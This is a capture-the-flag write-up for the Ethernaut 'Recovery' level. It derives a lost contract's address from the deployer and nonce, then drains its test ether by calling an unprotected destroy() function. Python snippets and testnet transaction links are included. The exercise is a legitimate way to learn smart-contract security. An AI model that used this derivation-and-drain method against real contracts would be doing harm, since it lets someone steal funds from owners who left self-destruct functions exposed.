# Recovery

## Objectives

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

## Solution

As specified in section 7 of the Ethereum yellowpaper, contract addresses are deterministic and can be derived from the deployer address of the contract and the nonce of the deployment transaction coming from deployer.

In this case we have that information from the get-go:

1. The contract deployer address (our instance, in my case `0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`)

2. The nonce of the deployment of the first SimpleToken (1 as stated on the exercise)

Therefore, we can compute the contract address of the first SimpleToken deployment easily, which results in `0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`. 

Technically, it is easy to cheat here, since the contract address of the contract we want to drain is easy to see on a block explorer by inspecting the internal transactions of the instance contract. However, the objective of the exercise is to derive the address ourselves.

With this information, all we have to do now is call the `destroy()` function in the SimpleToken contract and direct the funds within it to any address in order to mark the exercise as completed.

## How I did it

1. Once we have these two details (deployer address, nonce) as I described in [solution](#solution), we can code a function in python (or directly in solidity) to obtain the address. As a resourceful developer, even though I know how to compute this, I still decided to go and find a ready made solution in StackExchange in order to skip this:

```python
# compute address of a given contract to be deployed from
# the deployer address + nonce, as stated in the Section 7 
# of the Ethereum yellowpaper for contracts created using CREATE
def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.
    # Modified from Mikko Ohtamaa's original answer which was later
    # edited by Utgarda
    # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    """
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)
```

I would change a few things but if it ain't broke, don't fix it.

2. Then, we can plug in these values and find the address of that first ever SimpleToken deployment:

```python
first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)
```

3. Connect to this contract and call the `destroy()` function, sending the funds to my address.

```python
simpletoken.destroy(acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x8f6213e0626f9f592ef4be898c9bbbe08e1782425ab844602925c57359af7fa1

1. Check that we have actually drained the contract address.

```python
balance_assertion = simpletoken.balance() == 0
print(f"The balance of SimpleToken is zero: {balance_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x81b43555a6325d320d659ccf655e73431e3c70dd531c0db40dd34311bcd46553
